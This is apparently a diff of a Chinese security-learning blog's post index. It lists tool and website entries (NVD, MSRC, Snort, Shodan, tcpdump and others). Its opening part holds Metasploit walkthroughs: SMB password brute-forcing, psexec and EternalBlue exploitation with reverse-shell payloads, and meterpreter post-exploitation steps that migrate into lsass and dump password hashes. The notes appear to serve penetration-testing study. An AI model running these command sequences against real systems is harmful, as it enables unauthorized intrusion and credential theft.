 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line"></span><br><span class="line">search smb_login</span><br><span class="line"><span class="comment"># 搜索关于 smb_login 模块</span></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line"><span class="comment"># 使用 auxiliary/scanner/smb/smb_login 模块</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts 192.0.2.1</span><br><span class="line"><span class="comment"># 设置目标 IP 为 192.0.2.1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> smbuser cypher</span><br><span class="line"><span class="comment"># 设置目标 smbuser 为 cypher</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> pass_file /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt </span><br><span class="line"><span class="comment"># 设置密码字典路径为 /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt </span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br></pre></td></tr></table></figure>
@@ -960,9 +956,27 @@
 
 
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="comment"># 使用 exploit/windows/smb/psexec 模块</span></span><br><span class="line"></span><br><span class="line">show payloads</span><br><span class="line"><span class="comment"># 显示可用的 payloads</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="comment"># 设置选择 payload</span></span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 显示设置选项</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts 192.0.2.1</span><br><span class="line"><span class="comment"># 设置目标 IP 为 192.0.2.1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> smbuser cypher</span><br><span class="line"><span class="comment"># 设置目标 smbuser 为 cypher</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> smbpass passwd</span><br><span class="line"><span class="comment"># 设置目标 smbupass 为 passwd</span></span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 显示设置选项再次检查</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line"></span><br><span class="line">getuid</span><br><span class="line"><span class="comment"># 成功连接到 meterpreter，显示当前用户身份 </span></span><br><span class="line"></span><br><span class="line">sysinfo</span><br><span class="line"><span class="comment"># 显示系统信息</span></span><br><span class="line"></span><br><span class="line">Ctrl + z</span><br><span class="line"><span class="comment"># 挂起，返回 msfconsole</span></span><br><span class="line"></span><br><span class="line">use post/windows/gather/enum_domain</span><br><span class="line"><span class="comment"># 使用 post/windows/gather/enum_domain 模块</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="comment"># 设置使用该模块的 session</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line"></span><br><span class="line">use post/windows/gather/enum_shares</span><br><span class="line"><span class="comment"># 使用 post/windows/gather/enum_shares 模块</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="comment"># 设置使用该模块的 session</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line"></span><br><span class="line">sessions -i 1</span><br><span class="line"><span class="comment"># 继续连接到 session 1，返回 meterpreter</span></span><br><span class="line"></span><br><span class="line">getpid</span><br><span class="line"><span class="comment"># 获取当前 meterpreter 的 PID</span></span><br><span class="line"></span><br><span class="line">ps</span><br><span class="line"><span class="comment"># 列出正在运行的进程</span></span><br><span class="line"></span><br><span class="line">migrate 732</span><br><span class="line"><span class="comment"># 迁移 meterpreter 到 PID 为 732 的程序，可伪装，可监听，稳定连接</span></span><br><span class="line"></span><br><span class="line">hashdump</span><br><span class="line"><span class="comment"># 直接尝试获取 hash</span></span><br><span class="line"></span><br><span class="line">search -f file.txt</span><br><span class="line"><span class="comment"># 尝试搜索 file.txt 文件</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line"></span><br><span class="line">nmap -sV --script vuln 192.0.2.1</span><br><span class="line"><span class="comment"># nmap 扫描版本和漏洞</span></span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="comment"># 使用 exploit/windows/smb/ms17_010_eternalblue 模块</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts 192.0.2.1</span><br><span class="line"><span class="comment"># 设置目标 IP 为 192.0.2.1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/shell/reverse_tcp</span><br><span class="line"><span class="comment"># 设置反向 tcp payload</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line"></span><br><span class="line">Ctrl + z</span><br><span class="line"><span class="comment"># 回到 msfconsole</span></span><br><span class="line"></span><br><span class="line">sessions -u 1</span><br><span class="line"><span class="comment"># 尝试提权到 meterpreter，可能会失败，多尝试几次</span></span><br><span class="line"></span><br><span class="line">getuid</span><br><span class="line"><span class="comment"># 显示当前用户身份 </span></span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line"><span class="comment"># 启动 meterpreter 的 shell</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># 尝试命令</span></span><br><span class="line"></span><br><span class="line">Ctrl + z</span><br><span class="line"><span class="comment"># 回到 meterpreter</span></span><br><span class="line"></span><br><span class="line">migrate 700</span><br><span class="line"><span class="comment"># 迁移 meterpreter 到 PID 为 700 的 lsass.exe</span></span><br><span class="line"></span><br><span class="line">hashdump</span><br><span class="line"><span class="comment"># 获取 hash 密码</span></span><br><span class="line"></span><br><span class="line">search -f *file*</span><br><span class="line"><span class="comment"># 搜索系统中，模糊搜索关于 file 的文件</span></span><br></pre></td></tr></table></figure>
 <br>]]></content>
       <categories>
         <category>工具</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Microsoft Security Response Center</title>
+    <url>/2025/06/12/T-Microsoft-Security-Response-Center/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Microsoft-Security-Response-Center"><a href="#Microsoft-Security-Response-Center" class="headerlink" title="Microsoft Security Response Center"></a><a href="https://msrc.microsoft.com/update-guide/vulnerability">Microsoft Security Response Center</a></h3><h3 id="Microsoft®-更新目录"><a href="#Microsoft®-更新目录" class="headerlink" title="Microsoft® 更新目录"></a><a href="https://www.catalog.update.microsoft.com/Home.aspx">Microsoft® 更新目录</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>Microsoft 安全响应中心 (MSRC) 负责调查所有影响 Microsoft 产品和服务的安全漏洞报告，并在此提供信息，作为持续努力的一部分，帮助您管理安全风险并保护您的系统。<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
       </categories>
   </entry>
   <entry>
@@ -979,14 +993,13 @@
       </categories>
   </entry>
   <entry>
-    <title>Microsoft Security Response Center</title>
-    <url>/2025/06/12/T-Microsoft-Security-Response-Center/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Microsoft-Security-Response-Center"><a href="#Microsoft-Security-Response-Center" class="headerlink" title="Microsoft Security Response Center"></a><a href="https://msrc.microsoft.com/update-guide/vulnerability">Microsoft Security Response Center</a></h3><h3 id="Microsoft®-更新目录"><a href="#Microsoft®-更新目录" class="headerlink" title="Microsoft® 更新目录"></a><a href="https://www.catalog.update.microsoft.com/Home.aspx">Microsoft® 更新目录</a></h3><br>
+    <title>NVD</title>
+    <url>/2025/05/13/T-NVD/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="NVD"><a href="#NVD" class="headerlink" title="NVD"></a><a href="https://nvd.nist.gov/">NVD</a></h3><br>
 
 
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>Microsoft 安全响应中心 (MSRC) 负责调查所有影响 Microsoft 产品和服务的安全漏洞报告，并在此提供信息，作为持续努力的一部分，帮助您管理安全风险并保护您的系统。<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
-]]></content>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>NVD 是美国政府基于标准的漏洞管理数据存储库，使用安全内容自动化协议 (SCAP) 进行表示。这些数据支持漏洞管理、安全度量和合规性的自动化。NVD 包含安全检查表参考、安全相关软件缺陷、产品名称和影响指标的数据库。<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
       <categories>
         <category>网站</category>
       </categories>
@@ -1112,31 +1125,6 @@
       </categories>
   </entry>
   <entry>
-    <title>NVD</title>
-    <url>/2025/05/13/T-NVD/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="NVD"><a href="#NVD" class="headerlink" title="NVD"></a><a href="https://nvd.nist.gov/">NVD</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>NVD 是美国政府基于标准的漏洞管理数据存储库，使用安全内容自动化协议 (SCAP) 进行表示。这些数据支持漏洞管理、安全度量和合规性的自动化。NVD 包含安全检查表参考、安全相关软件缺陷、产品名称和影响指标的数据库。<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>PHP</title>
-    <url>/2025/05/14/T-PHP/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a><a href="https://www.php.net/">PHP</a></h3><h3 id="PHP-Manual"><a href="#PHP-Manual" class="headerlink" title="PHP Manual"></a><a href="https://www.php.net/manual/en/index.php">PHP Manual</a></h3><br>
-
-
-<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>PHP 是一种流行的通用脚本语言，尤其适合 Web 开发。<br>它快速、灵活、实用，能够支持从博客到全球热门网站的所有内容。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><p>下载安装<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Node.js</title>
     <url>/2025/05/14/T-Node-js/</url>
     <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a><a href="https://nodejs.org/en">Node.js</a></h3><h3 id="Node-js-v24-0-1-documentation"><a href="#Node-js-v24-0-1-documentation" class="headerlink" title="Node.js v24.0.1 documentation"></a><a href="https://nodejs.org/docs/latest/api/">Node.js v24.0.1 documentation</a></h3><br>
@@ -1165,55 +1153,24 @@
       </categories>
   </entry>
   <entry>
+    <title>PHP</title>
+    <url>/2025/05/14/T-PHP/</url>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a><a href="https://www.php.net/">PHP</a></h3><h3 id="PHP-Manual"><a href="#PHP-Manual" class="headerlink" title="PHP Manual"></a><a href="https://www.php.net/manual/en/index.php">PHP Manual</a></h3><br>
+
+
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>PHP 是一种流行的通用脚本语言，尤其适合 Web 开发。<br>它快速、灵活、实用，能够支持从博客到全球热门网站的所有内容。<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><p>下载安装<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Responder</title>
     <url>/2025/06/12/T-Responder/</url>
     <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><p><a href="https://github.com/lgandx/Responder">Responder</a><br><br></p>
 <h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>IPv6&#x2F;IPv4 LLMNR&#x2F;NBT-NS&#x2F;mDNS 毒化器和 NTLMv1&#x2F;2 中继。<br><br></p>
 <h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><p><a href="https://www.kali.org/tools/responder/">Kali</a><br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Shodan</title>
-    <url>/2025/05/13/T-Shodan/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a><a href="https://www.shodan.io/">Shodan</a></h3><h3 id="Search-Query-Examples"><a href="#Search-Query-Examples" class="headerlink" title="Search Query Examples"></a><a href="https://www.shodan.io/search/examples">Search Query Examples</a></h3><h3 id="Discover-Trends-on-the-Internet"><a href="#Discover-Trends-on-the-Internet" class="headerlink" title="Discover Trends on the Internet"></a><a href="https://trends.shodan.io/">Discover Trends on the Internet</a></h3><br>
-
-
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>Shodan 是全球首个面向联网设备的搜索引擎。探索互联网智能如何助您做出更明智的决策。<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
-]]></content>
-      <categories>
-        <category>网站</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>SecLists</title>
-    <url>/2025/06/05/T-SecLists/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="SecLists"><a href="#SecLists" class="headerlink" title="SecLists"></a><a href="https://github.com/danielmiessler/SecLists">SecLists</a></h3><br>
-
-
-<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>SecLists 是安全测试人员的得力助手。它汇集了安全评估过程中使用的多种类型的列表，并将它们集中到一起。列表类型包括用户名、密码、URL、敏感数据模式、模糊测试载荷、Web Shell 等等。其目标是使安全测试人员能够将此存储库拉取到新的测试环境中，并访问可能需要的每种类型的列表。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><h3 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a><a href="https://www.kali.org/tools/seclists/">Kali</a></h3><br>
-
-
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Snort</title>
-    <url>/2025/05/04/T-Snort/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Snort"><a href="#Snort" class="headerlink" title="Snort"></a><a href="https://www.snort.org/">Snort</a></h3><h3 id="Documents"><a href="#Documents" class="headerlink" title="Documents"></a><a href="https://www.snort.org/documents">Documents</a></h3><br>
-
-
-<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Snort 是全球领先的开源入侵防御系统 (IPS)。Snort IPS 使用一系列规则来定义恶意网络活动，并使用这些规则查找与这些活动匹配的数据包，然后向用户生成警报。</p>
-<p>Snort 也可以内联部署来阻止这些数据包。Snort 主要有三种用途：像 tcpdump 一样作为数据包嗅探器；作为数据包记录器（可用于网络流量调试）；或者，可以用作功能齐全的网络入侵防御系统。Snort 可供个人和企业下载和配置。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
-
-
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
       <categories>
         <category>工具</category>
@@ -1235,12 +1192,41 @@
       </categories>
   </entry>
   <entry>
-    <title>Updog</title>
-    <url>/2025/05/11/T-Updog/</url>
-    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Updog"><a href="#Updog" class="headerlink" title="Updog"></a><a href="https://github.com/sc0tfree/updog">Updog</a></h3><br>
+    <title>SecLists</title>
+    <url>/2025/06/05/T-SecLists/</url>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="SecLists"><a href="#SecLists" class="headerlink" title="SecLists"></a><a href="https://github.com/danielmiessler/SecLists">SecLists</a></h3><br>
 
 
-<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Updog 是 Python 的替代品SimpleHTTPServer。它允许通过 HTTP&#x2F;S 上传和下载，可以设置临时 SSL 证书并使用 HTTP 基本身份验证。<br><br></p>
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>SecLists 是安全测试人员的得力助手。它汇集了安全评估过程中使用的多种类型的列表，并将它们集中到一起。列表类型包括用户名、密码、URL、敏感数据模式、模糊测试载荷、Web Shell 等等。其目标是使安全测试人员能够将此存储库拉取到新的测试环境中，并访问可能需要的每种类型的列表。<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><h3 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a><a href="https://www.kali.org/tools/seclists/">Kali</a></h3><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Shodan</title>
+    <url>/2025/05/13/T-Shodan/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a><a href="https://www.shodan.io/">Shodan</a></h3><h3 id="Search-Query-Examples"><a href="#Search-Query-Examples" class="headerlink" title="Search Query Examples"></a><a href="https://www.shodan.io/search/examples">Search Query Examples</a></h3><h3 id="Discover-Trends-on-the-Internet"><a href="#Discover-Trends-on-the-Internet" class="headerlink" title="Discover Trends on the Internet"></a><a href="https://trends.shodan.io/">Discover Trends on the Internet</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>Shodan 是全球首个面向联网设备的搜索引擎。探索互联网智能如何助您做出更明智的决策。<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
+]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Snort</title>
+    <url>/2025/05/04/T-Snort/</url>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Snort"><a href="#Snort" class="headerlink" title="Snort"></a><a href="https://www.snort.org/">Snort</a></h3><h3 id="Documents"><a href="#Documents" class="headerlink" title="Documents"></a><a href="https://www.snort.org/documents">Documents</a></h3><br>
+
+
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Snort 是全球领先的开源入侵防御系统 (IPS)。Snort IPS 使用一系列规则来定义恶意网络活动，并使用这些规则查找与这些活动匹配的数据包，然后向用户生成警报。</p>
+<p>Snort 也可以内联部署来阻止这些数据包。Snort 主要有三种用途：像 tcpdump 一样作为数据包嗅探器；作为数据包记录器（可用于网络流量调试）；或者，可以用作功能齐全的网络入侵防御系统。Snort 可供个人和企业下载和配置。<br><br></p>
 <h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
 
 
@@ -1265,6 +1251,33 @@
       </categories>
   </entry>
   <entry>
+    <title>Let&#39;s Encrypt</title>
+    <url>/2025/05/28/T-Let-s-Encrypt/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Let’s-Encrypt"><a href="#Let’s-Encrypt" class="headerlink" title="Let’s Encrypt"></a><a href="https://letsencrypt.org/">Let’s Encrypt</a></h3><br>
+
+
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>Let’s Encrypt 是一家提供免费 TLS 证书的证书颁发机构，帮助网站轻松启用 HTTPS 加密，为每个人打造更安全的互联网。Let’s Encrypt 是非营利组织互联网安全研究小组 (Internet Security Research Group) 的一个项目。<br><br></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
+      <categories>
+        <category>网站</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Updog</title>
+    <url>/2025/05/11/T-Updog/</url>
+    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><h3 id="Updog"><a href="#Updog" class="headerlink" title="Updog"></a><a href="https://github.com/sc0tfree/updog">Updog</a></h3><br>
+
+
+<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Updog 是 Python 的替代品SimpleHTTPServer。它允许通过 HTTP&#x2F;S 上传和下载，可以设置临时 SSL 证书并使用 HTTP 基本身份验证。<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><br>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Vim Cheat Sheet</title>
     <url>/2025/05/11/T-Vim-Cheat-Sheet/</url>
     <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Vim-Cheat-Sheet"><a href="#Vim-Cheat-Sheet" class="headerlink" title="Vim Cheat Sheet"></a><a href="https://vim.rtorr.com/">Vim Cheat Sheet</a></h3><br>
@@ -1277,12 +1290,12 @@
       </categories>
   </entry>
   <entry>
-    <title>VirusTotal</title>
-    <url>/2025/05/13/T-VirusTotal/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="VirusTotal"><a href="#VirusTotal" class="headerlink" title="VirusTotal"></a><a href="https://www.virustotal.com/gui/home/upload">VirusTotal</a></h3><br>
+    <title>Windows CMD commands</title>
+    <url>/2025/05/13/T-Windows-CMD-commands/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Windows-CMD-commands"><a href="#Windows-CMD-commands" class="headerlink" title="Windows CMD commands"></a><a href="https://ss64.com/nt/">Windows CMD commands</a></h3><h3 id="Microsoft-Learn"><a href="#Microsoft-Learn" class="headerlink" title="Microsoft Learn"></a><a href="https://learn.microsoft.com/zh-cn/">Microsoft Learn</a></h3><br>
 
 
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>分析可疑文件、域、IP 和 URL 以检测恶意软件和其他漏洞，并自动与安全社区共享。<br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>Windows CMD命令的 AZ 索引 。<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
 ]]></content>
       <categories>
@@ -1290,12 +1303,12 @@
       </categories>
   </entry>
   <entry>
-    <title>Windows CMD commands</title>
-    <url>/2025/05/13/T-Windows-CMD-commands/</url>
-    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="Windows-CMD-commands"><a href="#Windows-CMD-commands" class="headerlink" title="Windows CMD commands"></a><a href="https://ss64.com/nt/">Windows CMD commands</a></h3><h3 id="Microsoft-Learn"><a href="#Microsoft-Learn" class="headerlink" title="Microsoft Learn"></a><a href="https://learn.microsoft.com/zh-cn/">Microsoft Learn</a></h3><br>
+    <title>VirusTotal</title>
+    <url>/2025/05/13/T-VirusTotal/</url>
+    <content><![CDATA[<h2 id="网站地址"><a href="#网站地址" class="headerlink" title="网站地址"></a>网站地址</h2><h3 id="VirusTotal"><a href="#VirusTotal" class="headerlink" title="VirusTotal"></a><a href="https://www.virustotal.com/gui/home/upload">VirusTotal</a></h3><br>
 
 
-<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>Windows CMD命令的 AZ 索引 。<br><br></p>
+<h2 id="网站介绍"><a href="#网站介绍" class="headerlink" title="网站介绍"></a>网站介绍</h2><p>分析可疑文件、域、IP 和 URL 以检测恶意软件和其他漏洞，并自动与安全社区共享。<br><br></p>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>搜索<br><br></p>
 ]]></content>
       <categories>
@@ -1521,8 +1534,10 @@
 
 
 <h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>这是tcpdump（一个强大的命令行数据包分析器）和 libpcap（一个用于网络流量捕获的可移植 C&#x2F;C++ 库） 的主页。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><p>下载安装<br><br></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><table>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><h3 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a><a href="https://www.kali.org/tools/tcpdump/">Kali</a></h3><br>
+
+
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="tcpdump-命令"><a href="#tcpdump-命令" class="headerlink" title="tcpdump 命令"></a>tcpdump 命令</h3><table>
 <thead>
 <tr>
 <th>命令</th>
@@ -1606,10 +1621,9 @@
 <td>以十六进制和 ASCII 格式显示数据包</td>
 </tr>
 </tbody></table>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -i &lt;INTERFACE&gt;</span><br><span class="line"><span class="comment"># &lt;INTERFACE&gt;: eth0, wlo1, any</span></span><br><span class="line"></span><br><span class="line">tcpdump -w &lt;FILE&gt;</span><br><span class="line"><span class="comment"># &lt;FILE&gt;: .pcap 文件</span></span><br><span class="line"></span><br><span class="line">tcpdump -c &lt;COUNT&gt;</span><br><span class="line"><span class="comment"># &lt;COUNT&gt;: 1/2/3...</span></span><br><span class="line"></span><br><span class="line">tcpdump host &lt;IP&gt;/&lt;HOSTNAME&gt;</span><br><span class="line"><span class="comment"># &lt;IP&gt;/&lt;HOSTNAME&gt;: 192.0.2.1/example.com</span></span><br><span class="line"></span><br><span class="line">tcpdump port &lt;PORT_NUMBER&gt;</span><br><span class="line"><span class="comment"># &lt;PORT_NUMBER&gt;: 53/22/80/443...</span></span><br><span class="line"></span><br><span class="line">tcpdump &lt;PROTOCOL&gt;</span><br><span class="line"><span class="comment"># &lt;PROTOCOL&gt;: ip, ip6, udp, tcp, icmp</span></span><br></pre></td></tr></table></figure>
